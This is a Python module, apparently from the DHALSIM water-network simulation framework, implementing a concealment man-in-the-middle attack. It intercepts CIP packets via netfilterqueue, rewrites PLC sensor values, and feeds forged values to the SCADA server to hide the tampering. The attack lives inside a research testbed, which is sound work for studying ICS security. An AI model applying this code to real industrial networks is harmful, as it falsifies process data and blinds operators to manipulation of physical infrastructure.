from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path

import os
import sys

import pandas as pd

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload


class ConcealmentMiTMNetfilterQueue(PacketQueue):

    def __init__(self,  intermediate_yaml_path: Path, yaml_index: int, queue_number: int ):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)
        self.attacked_tag = self.intermediate_attack['tag']
        self.scada_session_ids = []
        self.attack_session_ids = []
        self.concealment_type = None

        if 'concealment_data' in self.intermediate_attack.keys():
            if self.intermediate_attack['concealment_data']['type'] == 'path':
                self.concealment_type = 'path'
                self.concealment_data_pd = pd.read_csv(self.intermediate_attack['concealment_data'])
            elif self.intermediate_attack['concealment_data']['type'] == 'value':
                self.concealment_type = 'value'

    def capture(self, packet):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 102, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        :param packet: The captured packet.
        """
        try:
            p = IP(packet.get_payload())
            if 'TCP' in p:
                if len(p) == 116:
                    this_session =  int.from_bytes(p[Raw].load[4:8], sys.byteorder)
                    tag_name = p[Raw].load.decode(encoding='latin-1')[54:56]
                    if self.attacked_tag == tag_name:
                        # This is a packet being sent to SCADA server, conceal the manipulation
                        if p[IP].src == self.intermediate_yaml['scada']['public_ip']:
                            self.scada_session_ids.append(this_session)
                        else:
                            self.attack_session_ids.append(this_session)

                if len(p) == 102:
                    this_session = int.from_bytes(p[Raw].load[4:8], sys.byteorder)
                    if this_session in self.attack_session_ids:
                        value = translate_payload_to_float(p[Raw].load)

                        if 'value' in self.intermediate_attack.keys():
                            p[Raw].load = translate_float_to_payload(
                                self.intermediate_attack['value'], p[Raw].load)
                        elif 'offset' in self.intermediate_attack.keys():
                            p[Raw].load = translate_float_to_payload(
                                translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
                                    'offset'], p[Raw].load)

                        del p[IP].chksum
                        del p[TCP].chksum

                        packet.set_payload(bytes(p))
                        self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")


                    elif this_session in self.scada_session_ids:
                        self.logger.debug('Concealing to SCADA: ' + str(this_session))

                        if self.concealment_type == 'path':

                            exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
                            concealment_value = float(self.concealment_data_pd.loc[exp][self.attacked_tag].values[-1])
                            self.logger.debug('Concealing with value: ' + str(concealment_value))
                            p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
                        elif self.concealment_type == 'value':
                            concealment_value = float(self.intermediate_attack['concealment_data']['concealment_value'])
                            p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)

                        del p[IP].chksum
                        del p[TCP].chksum

                        packet.set_payload(bytes(p))
                        self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")

            packet.accept()
        except Exception as exc:
            print(exc)
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)

def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")
    parser.add_argument(dest="number", help="Number of que queue configured in IP Tables",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = ConcealmentMiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number = args.number)
    attack.main_loop()

